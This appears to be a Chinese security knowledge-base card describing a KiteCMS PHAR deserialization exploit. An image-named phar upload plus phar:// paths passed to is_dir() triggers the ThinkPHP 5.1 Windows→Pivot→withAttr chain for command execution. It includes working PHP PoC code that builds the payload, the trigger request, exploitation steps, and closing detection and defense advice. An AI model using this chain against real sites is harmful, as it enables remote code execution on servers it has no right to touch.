---
id: web-php-deserialization-kitecms-phar-is-dir-upload-path-thinkphp5-rce
title: KiteCMS PHAR 反序列化：图片后缀上传 phar + 多处 is_dir/phar:// 触发 TP5.1 Windows→Pivot→withAttr 链
type: scenario
domain: web
path: web/php/deserialization
technique: kitecms-phar-upload-is-dir-thinkphp5-windows-pivot-withattr-rce
tags:
- php
- kitecms
- phar
- deserialization
- thinkphp
- rce
- is-dir
- file-upload
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V644
  verified_at: '2026-11-13T03:32:30+08:00'
  notes: 已对照原文与截图 img31-38/51-61 核对：scanFilesForTree/scanFiles 源码 is_dir($dir)（img32/51）、Local.php:32 if(!is_dir($uploadPath))（img52/58）、phar.readonly 报错（img33）、metadata hexdump Windows/Pivot/withAttr=system（img34）、phar.png 上传成功（img37/53）、scanFilesForTree?dir=phar:// 触发并弹出计算器/异常（img38/56）、upload_path 改 phar:// 后任意上传触发（img59/61）。dedup top 候选为 file_get_contents sink 或不同 gadget 的 PHAR 卡，非同链。未验证点：未复跑；PHP 8.0+ 边界为通用事实非原文所述。
url: /docs/web/php/deserialization/web-php-deserialization-kitecms-phar-is-dir-upload-path-thinkphp5-rce/
draft: false
kb_aliases:
- KiteCMS PHAR 反序列化
- scanFilesForTree phar
- upload_path phar://
- TP5.1 Pivot withAttr 链
- KiteCMS phar rce
---

# 一句话结论

KiteCMS 的 ThinkPHP 5.1 环境存在多个可控 `is_dir()` 入口：后台 `scanFilesForTree($dir)`/`scanFiles($dir)` 直接接收 GET 的 `dir`，`Local::upload()` 对后台可配置的 `upload_path` 调用 `is_dir($uploadPath)`。把带恶意 metadata 的 phar 文件改名为 `.png` 经图片上传点落地后，令 `dir`/`upload_path` 为 `phar://<该文件>`，`is_dir()` 触发 Phar metadata 反序列化，走 `think\process\pipes\Windows` → `think\model\Pivot` → `Attribute::withAttr` 回调 `system`，执行任意命令。

# 原理

- **Phar 容器识别与 metadata 反序列化**：`phar://` 按文件内容（stub + manifest）识别归档，不要求 `.phar` 后缀；PHP 7.x 在打开 phar 时会反序列化 manifest 中的 metadata。把 metadata 设为恶意对象即可在“任何对 phar:// 路径的文件操作”处触发反序列化——本场景的 sink 是 `is_dir()`。
- **可控 sink 1：`Admin::scanFilesForTree($dir)`**：`if (is_dir($dir)) { opendir($dir); ... }`，`$dir` 来自请求参数（原文 `GET /admin/admin/scanFilesForTree?dir=phar://...`）。
- **可控 sink 2：`Admin::scanFiles($dir)`**：同样先 `if (!is_dir($dir)) return [];`，再 `scandir` 递归；`$dir` 来自 GET。
- **可控 sink 3：`Local::upload($file)`**：`$uploadPath = $this->config['upload_path']; if (!is_dir($uploadPath)) { mkdir(...); }`。`upload_path` 存在站点配置表中，可由后台“配置-上传”修改为 `phar://./upload/20230308/<hash>.png`；随后任意上传请求都会先执行 `is_dir($uploadPath)` 触发反序列化。
- **TP5.1 gadget 链**：metadata 为 `think\process\pipes\Windows`（`files` 数组含 `Pivot`）；`Windows::__destruct()` → `removeFiles()` → `file_exists($filename)` 对对象触发 `Pivot::__toString()` → `Model::toJson()` → `toArray()` → `getAttr()` → `getValue()`；`Attribute` trait 的 `withAttr` 中键值 `'v' => 'system'`、`data` 中 `'v' => 'calc'` 使 `$closure($value, $this->data)` 变成 `system('calc', ...)`。
- **上传通道**：phar 文件以 `GIF89a<?php __HALT_COMPILER(); ?>` 为 stub，图片类型白名单（默认 `jpg,png,gif`）允许 `.png`；`File::check()` 只校验后缀/大小，不校验内容，落地即可。
- **为什么成立**：Phar 的 metadata 反序列化是 PHP 的既定特性（PHP 8.0 起默认不再自动反序列化 metadata，链在高版本失效），配合 KiteCMS 把用户输入直接传给 `is_dir()` 的实现缺陷，形成“上传图片 → phar:// 触发 → TP5.1 POP 链 RCE”的完整链。

# 触发条件

- KiteCMS（ThinkPHP 5.1）环境，PHP 7.x（原文 PHP 7.3.4）；PHP 8.0+ 默认不自动反序列化 Phar metadata。
- 可访问后台上传点上传 `.png`（含 `GIF89a` stub 的 phar 文件），或前端会员上传点同样可上传图片后缀。
- 可触发任一 `is_dir` sink：后台 `scanFilesForTree`/`scanFiles` 的 `dir` 参数可达，或能把 `upload_path` 配置改为 `phar://...`。
- 上传文件路径可预测/可读（响应返回 `url`）。

# 利用步骤

1. 用 PHP 生成 phar：`Phar("phar.phar")`，`setStub("GIF89a<?php __HALT_COMPILER(); ?>")`，`setMetadata($windows)`，`addFromString("test.txt","test")`；`phar.readonly=Off`（原文遇到 readonly 报错即改 php.ini）。
2. 将 `phar.phar` 改名为 `1.png`，经后台 `/admin/upload/uploadfile.html`（或会员上传点）上传，记录返回的 `/upload/日期/<hash>.png`。
3. 触发 sink：
   - `GET /admin/admin/scanFilesForTree?dir=phar://./upload/20230308/<hash>.png`；
   - 或后台把 `upload_path` 配置改为 `phar://./upload/20230308/<hash>.png`，再任意上传；
   - 或 `scanFiles` 的 `dir` 参数。
4. `is_dir()` 打开 phar → 反序列化 metadata → `Windows`/`Pivot` 链 → `system()` 执行，原文以弹出计算器/异常页验证。

# PoC

```php
<?php
namespace think\process\pipes { class Windows { private $files; public function __construct($files){ $this->files = [$files]; } } }
namespace think\model\concern {
  trait Conversion {}
  trait Attribute {
    private $data;
    private $withAttr = ["v" => "system"];
    public function get(){ $this->data = ["v" => "calc"]; }
  }
}
namespace think { abstract class Model { use model\concern\Attribute; use model\concern\Conversion; } }
namespace think\model { class Pivot extends \think\Model { public function __construct(){ $this->get(); } } }
namespace {
  $a = new think\process\pipes\Windows(new think\model\Pivot());
  @unlink("phar.phar");
  $p = new Phar("phar.phar");
  $p->startBuffering();
  $p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
  $p->setMetadata($a);
  $p->addFromString("test.txt", "test");
  $p->stopBuffering();
}
```

```text
# 上传改名后的 1.png 后触发
GET /admin/admin/scanFilesForTree?dir=phar://./upload/20230308/<hash>.png
```

# 变体与关联

- `scanFiles()` 与 `Local::upload()` 的 `is_dir` 是同一链的不同 sink；后台 `upload_path` 配置注入可让“任意上传”都变成触发点。
- TP5.1 gadget 链的其他入口/下游：[[web-php-deserialization-thinkphp-memcached-crlf-session-poison-pivot-system-rce]]（Windows→Pivot→Request filter）、[[web-php-deserialization-thinkphp6-conversion-toarray-withattr-callback-rce]]（TP6 withAttr 回调）。
- 通用 Phar 上传技巧：[[web-php-deserialization-phar-upload-jpg-wakeup-eval]]、[[web-php-deserialization-phar-gif8-stub-inner-php-suffix-bypass]]。

# 检测与防御

- 检测：上传目录出现 `GIF89a` 开头但含 `__HALT_COMPILER();` 的文件；请求参数出现 `phar://`；后台 `scanFiles*` 接口异常 `dir`；配置文件被改为 `phar://`。
- 防御：升级 PHP 8.0+（metadata 默认不反序列化）；对 `is_dir`/文件操作参数做白名单/路径校验，禁止 `phar://` 等包装器；上传文件做内容检测并重命名；`upload_path` 固定为本地目录，不允许后台改协议；上传目录不可执行且不在 Web 根可解析。
